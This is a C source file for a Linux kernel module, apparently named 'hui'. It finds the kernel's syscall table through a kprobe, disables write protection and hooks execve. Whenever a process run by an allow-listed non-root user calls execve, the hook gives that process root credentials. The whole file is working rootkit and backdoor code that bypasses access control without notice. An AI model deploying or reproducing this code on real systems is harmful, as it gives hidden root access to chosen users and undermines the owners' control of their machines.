#include "hui_compat.h"
#include "hui.h"
unsigned long *hui_get_sys_call_table(void) {
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    unsigned long *table = NULL;
    typedef unsigned long (*kln_t)(const char *);
    kln_t kln;
    if (register_kprobe(&kp) < 0) return NULL;
    kln = (kln_t) kp.addr;
    unregister_kprobe(&kp);
    if (kln) table = (unsigned long *)kln("sys_call_table");
    return table;
}
void hui_elevate_root(void) {
    struct cred *new_cred;
    if (!current->mm) return;
    new_cred = prepare_kernel_cred(NULL);
    if (new_cred) { commit_creds(new_cred); }
}
asmlinkage long hui_hooked_execve_compat(const struct pt_regs *regs) {
    uid_t uid = HUI_CURRENT_UID;
    if (uid != 0 && hui_is_uid_allowed(uid)) hui_elevate_root();
    return hui_state.original_execve(regs);
}
int hui_hook_init(void) {
    hui_state.sys_call_table = hui_get_sys_call_table();
    if (!hui_state.sys_call_table) return -EFAULT;
    hui_state.original_execve = (void *)hui_state.sys_call_table[__NR_execve];
    hui_disable_wp();
    hui_state.sys_call_table[__NR_execve] = (unsigned long)hui_hooked_execve_compat;
    hui_enable_wp();
    return 0;
}
void hui_hook_exit(void) {
    if (hui_state.sys_call_table && hui_state.original_execve) {
        hui_disable_wp();
        hui_state.sys_call_table[__NR_execve] = (unsigned long)hui_state.original_execve;
        hui_enable_wp();
    }
}
